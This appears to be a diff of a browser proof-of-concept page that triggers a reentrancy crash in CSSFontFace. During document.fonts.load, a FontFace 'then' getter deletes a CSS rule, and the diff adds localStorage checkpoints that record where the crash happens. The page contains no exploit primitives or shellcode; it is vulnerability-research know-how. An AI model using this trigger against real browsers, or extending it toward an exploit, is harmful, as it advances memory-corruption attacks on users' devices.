@@ -1,9 +1,10 @@
 <!doctype html>
+
 <html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace original crash marker diagnostic</title>
+<title>CSSFontFace own-local hardmark diagnostic</title>
 <style>
 html {
     font-family: system-ui, -apple-system, sans-serif;
@@ -46,10 +47,9 @@ body {
 </style>
 </head>
 <body>
-<h1>CSSFontFace original crash marker diagnostic</h1>
+<h1>CSSFontFace own-local hardmark diagnostic</h1>
 <div class="box warn">
-Diagnostic-only page. No heap spray, no exploit primitives, no ARW/addrof/fakeobj,
-no shellcode, no ROP/JOP, no sandbox escape.
+Diagnostic-only. No heap spray, no exploit primitives, no shellcode, no ROP/JOP, no sandbox escape.
 </div>
 <div class="box">
     <div id="stage">Stage: not started</div>
@@ -70,7 +70,8 @@ no shellcode, no ROP/JOP, no sandbox escape.
         testRunner.dumpAsText();
         testRunner.waitUntilDone();
     }
-    const STORAGE_KEY = "cssfontface-original-crash-marker-log";
+    const STORAGE_KEY = "cssfontface-own-local-hardmark-log";
+    const LAST_KEY = STORAGE_KEY + "-last";
     const stageElement = document.getElementById("stage");
     const logElement = document.getElementById("log");
     const previousElement = document.getElementById("previous");
@@ -83,20 +84,32 @@ no shellcode, no ROP/JOP, no sandbox escape.
     function now() {
         return new Date().toISOString();
     }
+    function hardMark(msg) {
+        try {
+            localStorage.setItem(LAST_KEY, "[" + Date.now() + "] " + msg);
+        } catch (e) {
+        }
+    }
     function persist(line) {
         try {
             const old = localStorage.getItem(STORAGE_KEY) || "";
             localStorage.setItem(STORAGE_KEY, old + line + "\n");
+            localStorage.setItem(LAST_KEY, line);
         } catch (e) {
         }
     }
     function log(msg) {
+        hardMark("log entered: " + msg);
         const line = "[" + (++seq) + "] " + now() + " :: " + msg;
         logElement.textContent += line + "\n";
         persist(line);
-        try { console.log(line); } catch (e) {}
+        try {
+            console.log(line);
+        } catch (e) {
+        }
     }
     function stage(msg) {
+        hardMark("stage entered: " + msg);
         stageElement.textContent = "Stage: " + msg;
         log("STAGE => " + msg);
     }
@@ -104,6 +117,7 @@ no shellcode, no ROP/JOP, no sandbox escape.
         if (finished)
             return;
         finished = true;
+        hardMark("finish entered");
         log("NO CRASH OBSERVED");
         log("DONE");
         if (window.testRunner)
@@ -111,50 +125,69 @@ no shellcode, no ROP/JOP, no sandbox escape.
     }
     function loadPrevious() {
         try {
-            previousElement.textContent = localStorage.getItem(STORAGE_KEY) || "";
+            previousElement.textContent =
+                "LAST CHECKPOINT:\n" +
+                (localStorage.getItem(LAST_KEY) || "") +
+                "\n\nFULL LOG:\n" +
+                (localStorage.getItem(STORAGE_KEY) || "");
         } catch (e) {
             previousElement.textContent = "localStorage unavailable: " + e;
         }
     }
     window.onerror = function (message, source, lineno, colno, error) {
+        hardMark("window.onerror");
         log("window.onerror: " + message + " at " + lineno + ":" + colno);
         if (error && error.stack)
             log("stack: " + error.stack);
     };
     window.onunhandledrejection = function (event) {
+        hardMark("unhandledrejection");
         log("unhandledrejection: " + event.reason);
     };
     window.addEventListener("beforeunload", function () {
+        hardMark("beforeunload fired");
         log("beforeunload fired");
     });
     function sleep(ms) {
         return new Promise(resolve => setTimeout(resolve, ms));
     }
     function removeOldStyles() {
+        hardMark("removeOldStyles entered");
         const old = document.querySelectorAll("style[data-validation-style='1']");
         for (const node of old)
             node.remove();
+        hardMark("removeOldStyles exit");
     }
     function cleanupFaces() {
-        if (!document.fonts)
+        hardMark("cleanupFaces entered");
+        if (!document.fonts) {
+            hardMark("cleanupFaces: document.fonts missing");
             return;
+        }
         for (const face of createdFaces) {
             try {
+                hardMark("cleanupFaces: before document.fonts.delete");
                 document.fonts.delete(face);
+                hardMark("cleanupFaces: after document.fonts.delete");
             } catch (e) {
-                log("document.fonts.delete threw: " + e);
+                log("document.fonts.delete threw: " + e.name + ": " + e.message);
             }
         }
         createdFaces = [];
+        hardMark("cleanupFaces exit");
     }
     function cleanup() {
+        hardMark("cleanup entered");
         removeOldStyles();
         cleanupFaces();
+        hardMark("cleanup: before probe reset");
         probe.style.fontFamily = "";
         probe.textContent = "AB";
         active = null;
+        hardMark("cleanup exit");
     }
     function cssRuleCount(styleElement) {
+        hardMark("cssRuleCount entered");
         try {
             if (!styleElement || !styleElement.sheet)
                 return "no-sheet";
@@ -164,6 +197,7 @@ no shellcode, no ROP/JOP, no sandbox escape.
         }
     }
     function makeStyle(family, cssVariant) {
+        hardMark("makeStyle entered");
         const style = document.createElement("style");
         style.setAttribute("data-validation-style", "1");
         let src;
@@ -177,15 +211,20 @@ no shellcode, no ROP/JOP, no sandbox escape.
             '    src: ' + src + ';\n' +
             '    unicode-range: U+0042;\n' +
             '}\n';
+        hardMark("makeStyle: before appendChild");
         document.head.appendChild(style);
+        hardMark("makeStyle: after appendChild");
         return style;
     }
     function forceStyleRecalc(label) {
+        hardMark("forceStyleRecalc entered: " + label);
         log("MARK: ENTER forceStyleRecalc " + label);
         stage(label + " forceStyleRecalc body.offsetTop ENTER");
         log("MARK: before body.offsetTop");
         try {
+            hardMark("before body.offsetTop");
             const a = document.body.offsetTop;
+            hardMark("after body.offsetTop");
             log(label + ": body.offsetTop=" + a);
         } catch (e) {
             log(label + ": body.offsetTop threw: " + e.name + ": " + e.message);
@@ -195,7 +234,9 @@ no shellcode, no ROP/JOP, no sandbox escape.
         stage(label + " forceStyleRecalc probe.offsetWidth ENTER");
         log("MARK: before probe.offsetWidth");
         try {
+            hardMark("before probe.offsetWidth");
             const b = probe.offsetWidth;
+            hardMark("after probe.offsetWidth");
             log(label + ": probe.offsetWidth=" + b);
         } catch (e) {
             log(label + ": probe.offsetWidth threw: " + e.name + ": " + e.message);
@@ -205,7 +246,9 @@ no shellcode, no ROP/JOP, no sandbox escape.
         stage(label + " forceStyleRecalc getComputedStyle ENTER");
         log("MARK: before getComputedStyle(probe).fontFamily");
         try {
+            hardMark("before getComputedStyle(probe).fontFamily");
             const c = getComputedStyle(probe).fontFamily;
+            hardMark("after getComputedStyle(probe).fontFamily");
             log(label + ": fontFamily=" + c);
         } catch (e) {
             log(label + ": getComputedStyle threw: " + e.name + ": " + e.message);
@@ -213,49 +256,40 @@ no shellcode, no ROP/JOP, no sandbox escape.
         log("MARK: after getComputedStyle(probe).fontFamily");
         stage(label + " forceStyleRecalc getComputedStyle EXIT");
         log("MARK: EXIT forceStyleRecalc " + label);
+        hardMark("forceStyleRecalc exit: " + label);
+    }
+    function checkOne(label, family, text) {
+        hardMark("checkOne entered: " + text);
+        stage(label + " document.fonts.check " + text + " ENTER");
+        log("MARK: before document.fonts.check " + text);
+        let result = null;
+        try {
+            hardMark("before document.fonts.check " + text);
+            result = document.fonts.check('16px "' + family + '"', text);
+            hardMark("after document.fonts.check " + text);
+            log(label + " " + text + "=" + result);
+        } catch (e) {
+            log(label + " " + text + " threw: " + e.name + ": " + e.message);
+        }
+        log("MARK: after document.fonts.check " + text);
+        stage(label + " document.fonts.check " + text + " EXIT");
+        return result;
     }
     function checkBeforeLoad(family) {
-        let checkA = null;
-        let checkB = null;
-        let checkAB = null;
-        stage("before load check A ENTER");
-        log("MARK: before document.fonts.check before load A");
-        try {
-            checkA = document.fonts.check('16px "' + family + '"', "A");
-            log("document.fonts.check before load A=" + checkA);
-        } catch (e) {
-            log("document.fonts.check before load A threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after document.fonts.check before load A");
-        stage("before load check A EXIT");
-        stage("before load check B ENTER");
-        log("MARK: before document.fonts.check before load B");
-        try {
-            checkB = document.fonts.check('16px "' + family + '"', "B");
-            log("document.fonts.check before load B=" + checkB);
-        } catch (e) {
-            log("document.fonts.check before load B threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after document.fonts.check before load B");
-        stage("before load check B EXIT");
-        stage("before load check AB ENTER");
-        log("MARK: before document.fonts.check before load AB");
-        try {
-            checkAB = document.fonts.check('16px "' + family + '"', "AB");
-            log("document.fonts.check before load AB=" + checkAB);
-        } catch (e) {
-            log("document.fonts.check before load AB threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after document.fonts.check before load AB");
-        stage("before load check AB EXIT");
+        hardMark("checkBeforeLoad entered");
+        const checkA = checkOne("before load", family, "A");
+        const checkB = checkOne("before load", family, "B");
+        const checkAB = checkOne("before load", family, "AB");
         log("CHECK SUMMARY before load: A=" + checkA + ", B=" + checkB + ", AB=" + checkAB);
         if (checkA === false && checkB === true && checkAB === false)
             stage("MATCHED ORIGINAL CRASH STATE A=false B=true AB=false");
         else
             stage("CHECK STATE DIFFERENT: A=" + checkA + " B=" + checkB + " AB=" + checkAB);
+        hardMark("checkBeforeLoad exit");
         return { a: checkA, b: checkB, ab: checkAB };
     }
     function mutateFromThenGetter(label) {
+        hardMark("mutateFromThenGetter entered");
         if (!active)
             return;
         active.reentered = true;
@@ -266,7 +300,9 @@ no shellcode, no ROP/JOP, no sandbox escape.
         try {
             const sheet = active.styleElement && active.styleElement.sheet;
             if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
+                hardMark("before deleteRule(0)");
                 sheet.deleteRule(0);
+                hardMark("after deleteRule(0)");
                 log("deleteRule(0) executed");
             } else {
                 log("deleteRule skipped: no cssRules");
@@ -290,9 +326,11 @@ no shellcode, no ROP/JOP, no sandbox escape.
         } catch (e) {
             log("document.fonts.check after mutation threw: " + e.name + ": " + e.message);
         }
+        hardMark("mutateFromThenGetter exit");
     }
     function makeThenGetter(label) {
         return function () {
+            hardMark("then getter read: " + label);
             log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
             if (active && active.armed)
                 mutateFromThenGetter(label);
@@ -324,17 +362,22 @@ no shellcode, no ROP/JOP, no sandbox escape.
         });
     }
     function createJSFace(family) {
+        hardMark("createJSFace entered");
         const face = new FontFace(
             family,
             'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
             { unicodeRange: "U+0041" }
         );
         createdFaces.push(face);
+        hardMark("createJSFace exit");
         return face;
     }
     async function runDocumentFontsLoad(getterMode, cssVariant) {
+        hardMark("runDocumentFontsLoad entered: " + getterMode + "/" + cssVariant);
         cleanup();
+        hardMark("after cleanup");
         runCounter++;
+        hardMark("after runCounter++");
         if (!window.FontFace) {
             stage("FontFace API missing");
             log("FontFace API is not available");
@@ -346,9 +389,13 @@ no shellcode, no ROP/JOP, no sandbox escape.
             return;
         }
         const family = "ps5-reentry-" + getterMode + "-" + cssVariant + "-" + Date.now() + "-" + runCounter;
-        const styleElement = makeStyle(family, cssVariant);
+        hardMark("before makeStyle");
+        const styleElement = makeStyle(family);
+        hardMark("after makeStyle");
+        hardMark("before probe font assignment");
         probe.style.fontFamily = '"' + family + '"';
         probe.textContent = "AB";
+        hardMark("after probe font assignment");
         active = {
             family: family,
             styleElement: styleElement,
@@ -372,26 +419,34 @@ no shellcode, no ROP/JOP, no sandbox escape.
                 protoChanged = true;
                 log("installed getter on FontFace.prototype.then");
             }
+            hardMark("before createJSFace");
             const jsFace = createJSFace(family);
+            hardMark("after createJSFace");
             log("created JS FontFace; status=" + jsFace.status);
             if (getterMode === "own") {
+                hardMark("before define own jsFace.then");
                 Object.defineProperty(jsFace, "then", {
                     configurable: true,
                     get: makeThenGetter("jsFace.then")
                 });
+                hardMark("after define own jsFace.then");
                 log("installed own getter on jsFace.then");
             }
             log('"then" in jsFace = ' + ("then" in jsFace));
             log("own then descriptor exists = " + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
             log("prototype then descriptor exists = " + !!Object.getOwnPropertyDescriptor(FontFace.prototype, "then"));
+            hardMark("before jsFace.loaded access");
             const loadedPromise = jsFace.loaded;
+            hardMark("after jsFace.loaded access");
             log("accessed jsFace.loaded before document.fonts.load; face.status=" + jsFace.status);
             loadedPromise.then(function (value) {
                 log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
             }, function (error) {
                 log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
             });
+            hardMark("before document.fonts.add");
             document.fonts.add(jsFace);
+            hardMark("after document.fonts.add");
             log("added JS face to document.fonts; size=" + document.fonts.size + ", status=" + jsFace.status);
             const beforeState = checkBeforeLoad(family);
             log("MARK: completed document.fonts.check before load sequence");
@@ -402,7 +457,9 @@ no shellcode, no ROP/JOP, no sandbox escape.
             active.armed = true;
             stage("calling document.fonts.load");
             log("MARK: before document.fonts.load call");
+            hardMark("before document.fonts.load call");
             const loadPromise = document.fonts.load('16px "' + family + '"', "AB");
+            hardMark("after document.fonts.load call");
             log("MARK: after document.fonts.load call");
             log("document.fonts.load returned Promise");
             const result = await withTimeout(loadPromise, 5000);
@@ -451,121 +508,35 @@ no shellcode, no ROP/JOP, no sandbox escape.
             }
         }
     }
-    async function runDirectJSFaceLoad() {
-        cleanup();
-        runCounter++;
-        if (!window.FontFace) {
-            stage("FontFace API missing");
-            return;
-        }
-        const family = "ps5-direct-jsface-" + Date.now() + "-" + runCounter;
-        active = {
-            family: family,
-            styleElement: null,
-            armed: false,
-            reentered: false,
-            reentryCount: 0
-        };
-        stage("direct jsFace.load diagnostic");
-        try {
-            const jsFace = createJSFace(family);
-            Object.defineProperty(jsFace, "then", {
-                configurable: true,
-                get: makeThenGetter("direct jsFace.then")
-            });
-            log("created JS FontFace; status=" + jsFace.status);
-            log("installed own getter on jsFace.then");
-            const loadedPromise = jsFace.loaded;
-            log("accessed jsFace.loaded before jsFace.load()");
-            loadedPromise.then(function (value) {
-                log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
-            }, function (error) {
-                log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
-            });
-            active.armed = true;
-            stage("calling jsFace.load");
-            const p = jsFace.load();
-            log("jsFace.load returned Promise");
-            const result = await withTimeout(p, 5000);
-            active.armed = false;
-            if (result.type === "resolved")
-                log("jsFace.load resolved; valueIsFace=" + (result.value === jsFace) + ", status=" + jsFace.status);
-            else if (result.type === "rejected")
-                log("jsFace.load rejected: " + result.error + ", status=" + jsFace.status);
-            else
-                log("jsFace.load timed out; status=" + jsFace.status);
-            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-            if (active.reentered)
-                stage("direct jsFace.load caused then getter read");
-            else
-                stage("direct jsFace.load did NOT read then getter");
-        } catch (e) {
-            active.armed = false;
-            stage("direct test exception");
-            log("exception: " + e.name + ": " + e.message);
-        }
-    }
-    function runManualGetterSanity() {
-        cleanup();
-        runCounter++;
-        if (!window.FontFace) {
-            stage("FontFace API missing");
-            return;
-        }
-        const family = "ps5-manual-" + Date.now() + "-" + runCounter;
-        active = {
-            family: family,
-            styleElement: null,
-            armed: true,
-            reentered: false,
-            reentryCount: 0
-        };
-        stage("manual getter sanity check");
-        try {
-            const jsFace = createJSFace(family);
-            Object.defineProperty(jsFace, "then", {
-                configurable: true,
-                get: makeThenGetter("manual jsFace.then")
-            });
-            log("installed own getter on jsFace.then");
-            log("about to read jsFace.then manually");
-            const value = jsFace.then;
-            log("manual read returned: " + value);
-            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-            if (active.reentered)
-                stage("manual getter works");
-            else
-                stage("manual getter did NOT work");
-        } catch (e) {
-            stage("manual test exception");
-            log("exception: " + e.name + ": " + e.message);
-        } finally {
-            active.armed = false;
-        }
-    }
-        async function runAll() {
+    async function runAll() {
+        hardMark("runAll entered");
         loadPrevious();
-
+        /*
+         * Important:
+         * Do not clear LAST_KEY before the run.
+         * If the page crashes early, LAST CHECKPOINT should still show where it stopped.
+         * We only clear the full log, not the last checkpoint.
+         */
         try {
             localStorage.removeItem(STORAGE_KEY);
         } catch (e) {
         }
-
-        log("POC STARTED: CSSFontFace own-local only crash marker diagnostic");
+        hardMark("after full log clear");
+        log("POC STARTED: CSSFontFace own-local only hardmark diagnostic");
+        hardMark("before stage own-local only");
         stage("auto sequence starting: own + local only");
-
-        // Important: run only the own + local path.
-        // Do not run manual getter, prototype, missing-font, or direct jsFace.load tests.
+        hardMark("before runDocumentFontsLoad own/local");
         await runDocumentFontsLoad("own", "local");
-
+        hardMark("after runDocumentFontsLoad own/local");
         await sleep(100);
-
         stage("auto sequence complete");
         finish();
     }
-
+    hardMark("script parsed, before setTimeout");
     setTimeout(function () {
+        hardMark("setTimeout fired, before runAll");
         runAll().catch(function (e) {
+            hardMark("runAll catch");
             log("TOP LEVEL RUNALL ERROR: " + e.name + ": " + e.message);
             finish();
         });
